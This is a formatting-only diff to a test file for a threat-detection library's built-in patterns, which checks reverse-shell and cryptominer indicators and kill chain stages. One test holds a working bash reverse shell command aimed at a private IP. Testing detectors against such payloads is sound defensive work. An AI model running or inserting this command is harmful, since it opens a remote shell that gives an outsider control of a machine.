@@ -76,7 +76,9 @@ describe('BUILTIN_THREAT_PATTERNS', () => {
 
   it('reverse shell patterns match real payloads', () => {
     const bashShell = BUILTIN_THREAT_PATTERNS.find((p) => p.id === 'threat-revshell-bash')!;
-    expect(bashShell.indicators.some((i) => i.test('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'))).toBe(true);
+    expect(bashShell.indicators.some((i) => i.test('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'))).toBe(
+      true
+    );
   });
 
   it('cryptominer patterns match stratum URLs', () => {
@@ -91,8 +93,13 @@ describe('BUILTIN_THREAT_PATTERNS', () => {
 
   it('patterns have valid kill chain stages', () => {
     const validStages = new Set([
-      'reconnaissance', 'weaponization', 'delivery', 'exploitation',
-      'installation', 'command_and_control', 'actions_on_objectives',
+      'reconnaissance',
+      'weaponization',
+      'delivery',
+      'exploitation',
+      'installation',
+      'command_and_control',
+      'actions_on_objectives',
     ]);
     for (const p of BUILTIN_THREAT_PATTERNS) {
       expect(validStages.has(p.killChainStage)).toBe(true);
